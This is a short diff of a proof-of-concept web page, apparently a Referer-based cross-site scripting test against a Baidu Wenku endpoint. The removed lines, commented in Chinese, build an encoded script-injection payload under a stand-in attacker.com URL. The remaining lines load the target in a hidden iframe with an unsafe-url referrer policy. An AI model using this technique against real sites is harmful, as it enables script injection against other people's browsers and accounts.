@@ -10,10 +10,6 @@
         iframe.referrerPolicy = 'unsafe-url';
         iframe.style.display = 'none';
         
-        // 构造含 Payload 的 URL（需用户访问此页面）
-        const payload = encodeURIComponent("</script><script>alert(document.domain)</script>");
-        const attackerUrl = `http://attacker.com/path/${payload}`; 
-        
         // 确保 iframe 请求时 Referer 包含完整攻击 URL
         iframe.src = `https://wenku.baidu.com/ndcore/browse/doctool?_wkts_=1739761113651&t=1739761158758&from=${Date.now()}`;
         
